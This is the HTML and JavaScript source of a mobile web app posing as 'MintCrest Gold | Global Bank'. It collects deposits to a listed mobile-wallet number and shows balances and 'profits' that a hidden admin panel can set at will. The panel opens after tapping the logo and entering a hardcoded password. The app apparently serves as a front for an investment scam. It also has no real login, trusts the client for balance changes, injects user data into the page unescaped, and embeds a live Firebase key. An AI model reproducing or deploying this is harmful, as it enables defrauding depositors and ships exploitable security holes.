<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Gold | Global Bank</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #00040a; color: white; margin: 0; overflow: hidden; }
        .page-content { height: 100vh; overflow-y: scroll; padding-bottom: 150px; scroll-behavior: smooth; }
        ::-webkit-scrollbar { display: none; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); }
        .grad-main { background: linear-gradient(135deg, #0052d4 0%, #4364f7 50%, #6fb1fc 100%); }
        .grad-gold { background: linear-gradient(135deg, #bf953f, #fcf6ba, #b38728, #fbf5b7, #aa771c); }
        .page { display: none; animation: slideUp 0.4s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .nav-btn { filter: grayscale(1); opacity: 0.4; transition: 0.4s; }
        .active-tab { filter: grayscale(0); opacity: 1; color: #00d4ff; }
        .broadcast-bar { background: #4364f7; color: white; padding: 5px; font-size: 10px; font-weight: 800; text-align: center; }
    </style>
</head>
<body>

    <div id="b-cast" class="broadcast-bar hidden"><marquee id="b-text">Welcome to MintCrest Official Node System!</marquee></div>

    <section id="auth-ui" class="fixed inset-0 z-[10000] bg-[#00040a] flex flex-col items-center justify-center p-8">
        <h1 onclick="adminTap()" class="text-4xl font-black italic tracking-tighter mb-10 text-white">MINTCREST</h1>
        <div class="glass p-8 rounded-[3rem] w-full max-w-xs text-center border-t border-white/20 shadow-2xl">
            <input type="text" id="user-name" placeholder="Full Name" class="w-full bg-white/5 p-5 rounded-2xl mb-5 text-center font-bold outline-none border border-white/10">
            <button onclick="login()" class="w-full grad-main py-5 rounded-2xl font-black uppercase text-xs shadow-xl">Unlock Node</button>
        </div>
    </section>

    <main id="app-ui" class="hidden relative">
        <div id="p-home" class="page active-page page-content p-6">
            <div class="flex justify-between items-center mt-4 mb-8">
                <div><h2 class="text-2xl font-black" id="v-user">User</h2><span id="vip-badge" class="text-[9px] font-black grad-gold text-black px-3 py-0.5 rounded-full">VIP 0</span></div>
                <button onclick="changePage('spin')" class="text-3xl">🎡</button>
            </div>
            <div class="grad-main p-8 rounded-[3rem] mb-8 shadow-2xl relative">
                <p class="text-[10px] font-black opacity-80 uppercase italic">Capital Node</p>
                <h2 class="text-5xl font-black my-2" id="v-bal">₨ 0</h2>
                <div class="mt-8 flex justify-between items-center border-t border-white/10 pt-4">
                    <p class="text-[10px] font-black uppercase">Net Profit: <span id="v-profit">₨ 0</span></p>
                    <button onclick="copyRef()" class="bg-black/20 px-4 py-1.5 rounded-lg text-[8px] font-black uppercase">🔗 Invite</button>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass py-8 rounded-[2.5rem] font-black text-xs uppercase text-cyan-400">Deposit</button>
                <button onclick="changePage('withdraw')" class="glass py-8 rounded-[2.5rem] font-black text-xs uppercase text-rose-500">Withdraw</button>
            </div>
        </div>

        <div id="p-wallet" class="page page-content p-6">
            <h3 class="text-center font-black text-xl italic mb-8 uppercase text-cyan-400">Deposit Capital</h3>
            <div class="grid grid-cols-3 gap-2 mb-8">
                <button onclick="selM('Easypaisa','03705519562')" class="glass p-3 rounded-xl text-[10px] font-black uppercase italic border-b-2 border-green-500">Easypaisa</button>
                <button onclick="selM('JazzCash','0300XXXXXXX')" class="glass p-3 rounded-xl text-[10px] font-black uppercase italic border-b-2 border-yellow-500">JazzCash</button>
                <button onclick="selM('Binance','TRC20-ADDR')" class="glass p-3 rounded-xl text-[10px] font-black uppercase italic border-b-2 border-orange-500">Binance</button>
            </div>
            <div id="dep-box" class="hidden glass p-8 rounded-[3rem] border-2 border-cyan-500/20">
                <p id="m-info" class="text-[10px] font-black text-cyan-400 mb-6 text-center uppercase"></p>
                <input type="number" id="d-amt" placeholder="Amount (Min 200)" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center font-bold border border-white/10 outline-none">
                <input type="text" id="d-tid" placeholder="TID / TRX Number" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center font-black border border-white/10 outline-none">
                <input type="file" id="d-file" class="w-full text-[10px] mb-6">
                <button onclick="subDep()" class="w-full grad-main py-5 rounded-2xl font-black text-xs uppercase">Submit Deposit</button>
            </div>
        </div>

        <div id="p-withdraw" class="page page-content p-6">
            <div class="glass p-8 rounded-[3rem] border-t-8 border-rose-600 text-center">
                <h3 class="text-2xl font-black text-rose-500 mb-6 uppercase italic">Outflow</h3>
                <input type="text" id="w-user" readonly class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center text-[10px] font-black opacity-60 border border-white/5">
                <select id="w-method" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-xs font-black border border-white/10 outline-none appearance-none">
                    <option value="Easypaisa">Easypaisa</option>
                    <option value="JazzCash">JazzCash</option>
                    <option value="Binance">Binance (USDT)</option>
                    <option value="Bank">Bank Transfer</option>
                </select>
                <input type="number" id="w-amt" placeholder="Amount (Min 100)" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center font-bold border border-white/10 outline-none">
                <input type="text" id="w-acc" placeholder="Account Number & Title" class="w-full bg-white/5 p-4 rounded-xl mb-8 text-center text-xs font-black border border-white/10 outline-none">
                <button onclick="subWd()" class="w-full bg-rose-600 py-5 rounded-2xl font-black text-xs uppercase shadow-xl">Process Outflow</button>
            </div>
        </div>

        <div id="p-activity" class="page page-content p-6">
            <div class="flex justify-between items-center mb-8">
                <h3 class="font-black text-xl italic uppercase">History</h3>
                <button onclick="clearHis()" class="text-[8px] font-black bg-rose-500/20 text-rose-500 px-3 py-1 rounded-lg uppercase">Clear Logs</button>
            </div>
            <div id="user-history" class="space-y-3"></div>
        </div>

        <div id="p-invest" class="page page-content p-6"><div id="plans-list" class="space-y-4"></div></div>
        <div id="p-support" class="page page-content p-6 text-center">
            <div class="glass p-8 rounded-[3rem] border-t-4 border-green-500">
                <h2 class="text-2xl font-black mb-6 uppercase italic">Support Desk</h2>
                <button onclick="window.open('https://chat.whatsapp.com/YOUR_GROUP')" class="w-full bg-green-600 py-5 rounded-2xl font-black text-xs uppercase mb-4">Official Group</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#00040a] z-[50000] hidden overflow-y-auto p-8">
        <div class="flex justify-between items-center mb-10 border-b border-white/10 pb-6">
            <h2 class="text-xl font-black text-cyan-400 italic uppercase">Master Control</h2>
            <button onclick="closeAdm()" class="bg-rose-600 px-6 py-1.5 rounded-lg text-[10px] font-black uppercase italic">Exit</button>
        </div>

        <div class="glass p-6 rounded-3xl mb-8 border-l-4 border-blue-500">
            <p class="text-[10px] font-black text-blue-400 mb-4 uppercase">📢 Broadcast Message</p>
            <input type="text" id="adm-msg" placeholder="Write message to all users..." class="w-full bg-white/5 p-4 rounded-xl text-xs mb-3 border border-white/10 outline-none">
            <button onclick="sendBC()" class="w-full grad-main py-4 rounded-xl text-[9px] font-black uppercase italic shadow-lg">Push Broadcast</button>
        </div>

        <div class="glass p-6 rounded-3xl mb-8 border border-white/10">
            <input type="text" id="adm-u" placeholder="Username" class="w-full bg-white/5 p-4 rounded-xl text-xs mb-3 border border-white/10 outline-none">
            <input type="number" id="adm-v" placeholder="Value" class="w-full bg-white/5 p-4 rounded-xl text-xs mb-5 border border-white/10 outline-none">
            <div class="grid grid-cols-2 gap-3">
                <button onclick="editU('balance')" class="grad-main py-4 rounded-xl text-[8px] font-black uppercase">Set Bal</button>
                <button onclick="editU('profit')" class="grad-main py-4 rounded-xl text-[8px] font-black uppercase">Set Prof</button>
            </div>
        </div>

        <h3 class="text-xs font-black text-yellow-500 mb-6 uppercase italic tracking-tighter">Queue Dashboard ↓</h3>
        <div id="adm-reqs" class="space-y-4"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass p-7 flex justify-around items-center fixed bottom-0 w-full z-[2000] rounded-t-[3.5rem] border-t border-white/10">
        <button onclick="changePage('home')" id="n-home" class="nav-btn text-2xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn text-2xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="nav-btn text-2xl">📜</button>
        <button onclick="changePage('support')" id="n-support" class="nav-btn text-2xl">🎧</button>
    </nav>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg",
            authDomain: "investment-84f4e.firebaseapp.com",
            projectId: "investment-84f4e",
            storageBucket: "investment-84f4e.firebasestorage.app",
            messagingSenderId: "975293889308",
            appId: "1:975293889308:web:6d034a99cc966c75ff58d9"
        };
        firebase.initializeApp(firebaseConfig); 
        const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0; let curM = '';

        async function login() {
            const n = document.getElementById('user-name').value.trim(); if(!n) return;
            const ref = db.collection("users").doc(n); const d = await ref.get();
            if(!d.exists) await ref.set({ name: n, balance: 0, profit: 0, lastB: 0, totalDep: 0 });
            user = (await ref.get()).data();
            document.getElementById('v-user').innerText = n;
            document.getElementById('w-user').value = "USER: " + n.toUpperCase();
            document.getElementById('auth-ui').style.display='none';
            document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            startSync(n); syncBC();
        }

        // BroadCast System
        async function sendBC() {
            const m = document.getElementById('adm-msg').value;
            await db.collection("settings").doc("broadcast").set({ text: m, time: Date.now() });
            alert("Broadcasted, Sweetie! 😘");
        }

        function syncBC() {
            db.collection("settings").doc("broadcast").onSnapshot(d => {
                if(d.exists()) {
                    document.getElementById('b-cast').classList.remove('hidden');
                    document.getElementById('b-text').innerText = d.data().text;
                }
            });
        }

        // Deposit Logic
        function selM(m, a) { curM = m; document.getElementById('dep-box').classList.remove('hidden'); document.getElementById('m-info').innerText = `TRANSFER CAPITAL TO ${m}: ${a}`; }

        async function subDep() {
            const a = parseInt(document.getElementById('d-amt').value); const t = document.getElementById('d-tid').value; const f = document.getElementById('d-file').files[0];
            if(a < 200 || !t || !f) return alert("Sweetie, fill all details! 😘");
            const sRef = storage.ref(`proofs/${Date.now()}_${user.name}`); await sRef.put(f);
            const url = await sRef.getDownloadURL();
            await db.collection("requests").add({ user: user.name, amount: a, tid: t, proof: url, type: "Deposit", status: "pending", time: Date.now() });
            alert("Sent! Balance will update after Admin approval. ✨"); location.reload();
        }

        // Withdrawal Logic
        async function subWd() {
            const a = parseInt(document.getElementById('w-amt').value); const acc = document.getElementById('w-acc').value; const m = document.getElementById('w-method').value;
            if(!a || a > user.balance || a < 100) return alert("Min Withdrawal 100 or Low Balance!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            await db.collection("requests").add({ user: user.name, amount: a, acc: `${m}: ${acc}`, type: "Withdrawal", status: "pending", time: Date.now() });
            alert("Outflow Requested! 😘"); location.reload();
        }

        function startSync(n) {
            db.collection("users").doc(n).onSnapshot(d => { 
                user = d.data(); 
                document.getElementById('v-bal').innerText = "₨ "+(user.balance||0).toLocaleString(); 
                document.getElementById('v-profit').innerText = "₨ "+(user.profit||0).toLocaleString();
            });
            db.collection("requests").where("user", "==", n).orderBy("time", "desc").onSnapshot(s => {
                const l = document.getElementById('user-history'); l.innerHTML = '';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center mb-2"><div class="text-left font-black text-[10px] uppercase"><span>${x.type}</span></div><span class="text-[9px] font-black ${x.status === 'pending' ? 'text-yellow-500' : 'text-green-500'} uppercase">${x.status}</span></div>`; });
            });
        }

        async function clearHis() {
            if(confirm("Sweetie, clear all history logs?")) {
                const s = await db.collection("requests").where("user", "==", user.name).get();
                s.forEach(d => d.ref.delete()); alert("Logs Cleared! 😘");
            }
        }

        // Admin Panel Functions
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Secure Access:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdm() { document.getElementById('admin-panel').classList.add('hidden'); }
        async function editU(f) { const u = document.getElementById('adm-u').value; const v = parseInt(document.getElementById('adm-v').value); await db.collection("users").doc(u).update({ [f]: v }); alert("Command Success!"); }

        function syncAdm() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                const l = document.getElementById('adm-reqs'); l.innerHTML = '';
                s.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-6 rounded-[2rem] border-l-4 border-yellow-500"><p class="text-[10px] font-black uppercase text-cyan-400 mb-1">${x.user} | ${x.type}</p><p class="text-[9px] font-bold opacity-60">Amt: ${x.amount} | ID/Acc: ${x.tid || x.acc}</p>${x.proof ? `<a href="${x.proof}" target="_blank" class="block bg-cyan-600 text-center py-2 rounded-xl text-[8px] font-black mt-4 uppercase">View Proof</a>` : ''}<div class="flex gap-2 mt-6"><button onclick="hnd('${d.id}','${x.user}',${x.amount},'approved','${x.type}')" class="flex-1 grad-main py-4 rounded-xl text-[9px] font-black uppercase">Approve</button><button onclick="hnd('${d.id}','${x.user}',${x.amount},'rejected','${x.type}')" class="flex-1 bg-rose-600 py-4 rounded-xl text-[9px] font-black uppercase">Reject</button></div></div>`; });
            });
        }

        async function hnd(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(act==='approved' && type === "Deposit") await ref.update({ balance: (d.data().balance||0) + amt });
            else if(act==='rejected' && type === 'Withdrawal') await ref.update({ balance: (d.data().balance||0) + amt });
            await db.collection("requests").doc(id).update({ status: act });
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); document.getElementById('n-'+p).classList.add('active-tab'); }
    </script>
</body>
</html>
